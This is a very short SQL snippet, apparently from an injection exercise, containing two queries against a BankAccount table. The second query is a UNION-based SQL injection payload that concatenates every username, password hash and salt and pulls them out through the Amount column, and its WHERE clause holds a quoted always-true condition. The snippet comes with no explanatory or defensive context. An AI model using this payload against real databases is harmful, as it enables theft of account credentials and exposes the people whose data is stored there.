SELECT * FROM BankAccount;

SELECT Amount FROM BankAccount UNION SELECT GROUP_CONCAT(Username || ':' || PasswordHash || ':' || Salt, CHAR(13) || CHAR(10)) AS Salt FROM BankAccount WHERE '1 = 1';


